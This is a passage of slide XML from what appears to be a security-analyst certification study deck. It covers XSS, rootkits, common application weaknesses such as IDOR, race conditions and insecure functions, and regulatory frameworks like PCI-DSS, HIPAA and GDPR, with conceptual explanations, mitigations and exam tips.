  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Session Hijack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g_89d1b25ce1.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2098936" y="1783080"/>
            <a:ext cx="7991079" cy="4434840"/>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409</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Cross-site scripting (XSS)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Cross-site scripting is a web vulnerability in which an attacker injects malicious client-side script (typically JavaScript) into a web page that other users then load, causing their browsers to execute the attacker's code in the context of the trusted site.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The three types are stored/persistent XSS (the payload is saved on the server, such as in a comment, and served to every viewer), reflected XSS (the payload is echoed back from a request, usually via a crafted link), and DOM-based XSS (the injection happens entirely in the browser's page script); all stem from failing to validate input and encode output.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A successful XSS attack can steal session cookies, log keystrokes, redirect users, or perform actions as the victim.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because XSS is a persistent top web risk that feeds session hijacking and account takeover, and remediation centers on input validation, context-aware output encoding, and a Content Security Policy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions distinguishing stored, reflected, and DOM-based XSS and identifying output encoding, input validation, and CSP as the correct mitigations.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410</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Cross-site scripting (XSS)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g_acb9c172ac.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1800512"/>
            <a:ext cx="10634472" cy="4399976"/>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411</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Privilege Escalation (3)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g_2b6565e960.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1984970"/>
            <a:ext cx="10634472" cy="4031060"/>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412</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Rootkit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A rootkit is a stealthy form of malware designed to gain and maintain privileged (root/administrator) access to a system while hiding its own presence and the presence of other malicious processes, files, and network connections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Rootkits operate at different levels: user-mode rootkits hook application APIs, kernel-mode rootkits modify the operating system core to falsify what tools report, and the most severe firmware/bootkit variants live in the BIOS/UEFI or boot loader so they persist beneath the OS and survive reinstallation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because they subvert the very system calls that monitoring tools rely on, a compromised host can report itself as clean while remaining fully controlled by the attacker.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts treat rootkits as a high-severity persistence mechanism, detecting them with integrity checking, behavioral and memory analysis, secure/measured boot, and out-of-band verification, and often the safest remediation is to rebuild the system from known-good media.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests recognizing a rootkit from symptoms of hidden processes and integrity subversion, understanding kernel/firmware persistence, and knowing that reimaging is often the required remediation.</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413</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Rootkit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g_ac16252bcf.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2087923" y="1783080"/>
            <a:ext cx="8013106" cy="4434840"/>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414</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities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Beyond injection, several common software weaknesses arise from insecure coding practices, including improper error handling, dereferencing, and insecure object references.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Improper error handling occurs when messages reveal too much internal detail (stack traces, file paths, database structure) that helps an attacker map the system, or when an unhandled error crashes the program instead of failing gracefully; the fix is to log full detail internally but return only a generic message to the user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A dereferencing flaw happens when code follows a pointer or object reference to memory that is no longer valid (a null or dangling pointer), causing crashes or exploitable behavior, so references must be validated before use.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Insecure object referencing (insecure direct object reference, IDOR) exposes an internal identifier (such as a record or account ID) that an attacker can manipulate to access another user's data because the application fails to check authorization on each request; analysts flag these because they lead to information disclosure, denial of service, and unauthorized data access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions matching a described symptom (verbose error messages, null-pointer crash, an ID that can be changed to view another user's record) to the correct weakness and its secure-coding remedy such as generic errors, pointer validation, and per-request authorization checks.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415</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities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Improper error handling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Error messages sometimes give away too much information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Error messages should only give enough information to solve the problem</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Don’t send error message and then crash the program</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416</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities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Dereferencing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Pointer attempts to access some value in the memory that is no longer there</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Following the pointer can cause an operational error</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Never follow a pointer until you verify it’s valid</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Fail gracefully</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417</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities (3)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Insecure object referencing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Make sure access controls operate at all levels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Direct record ID used to access unauthorized data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Always authenticate every request</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418</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities (4)</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Race condition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Time difference between checking the permissions of a subject requesting a resource and allowing accessing to the resource</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Called the TOCTOU (time-of-check to time-of-use)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Never allow access after authentication but before use</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Never provide access to data without checking identity</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419</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities (5)</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Broken authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Don’t authenticate, assign a session ID, and assume from then on, it’s always the same user if it’s the same session ID</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420</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities (6)</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Sensitive data exposure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Application’s responsibility to protect data and only allow access to authorized users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421</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities (7)</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Insecure components</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Insecure parts of applications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  All applications are modular</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  They rely on libraries, external functions, or interactions with other components</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Interacting with insecure components causes insecurities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422</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities (8)</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Logging and monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Most common logging is to export to log files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Log files are critical to finding out what happened</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Make sure applications have logging enabled</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423</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities (9)</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Default configurations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Vendors try to set them appropriately</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Common to have to change the settings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Default user IDs are a vulnerability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Change default configurations to most secure settings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Remove unused user IDs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424</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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APPLICATION VULNERABILITIES, PART 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Vulnerabilities (10)</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Insecure functions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  strcpy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  User proper software development standards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Make sure developers understand what not to do</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Provide sufficient feedback</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425</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VULNERABILITY IDENTIFICATION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Regulatory Environments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Regulatory and standards frameworks define the security and privacy obligations an organization must meet, and they directly drive which vulnerabilities must be remediated and how quickly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Key ones include ISO/IEC 27001 (an international standard for building an information security management system), PCI-DSS (mandatory controls for any organization that stores, processes, or transmits payment card data), HIPAA (protection of U.S. protected health information), and GDPR (the EU regulation governing personal data with strict breach notification and heavy fines).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Internally, corporate policy and data classification determine how information is labeled and protected, translating external mandates into enforceable rules.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because compliance requirements set remediation priorities and timelines (for example PCI-DSS mandates regular scanning and remediation of high-risk findings), so a vulnerability affecting regulated data often outranks one with a higher raw CVSS score.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to match each framework to its scope (PCI-DSS to cardholder data, HIPAA to health data, GDPR to EU personal data, ISO/IEC 27001 to the ISMS) and to recognize that compliance context influences vulnerability prioritization.</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426</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VULNERABILITY IDENTIFICATION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Regulatory Environments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ISO/IEC 27001</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Standard for managing information systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Payment Card Industry Data Security Standard (PCI-DSS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
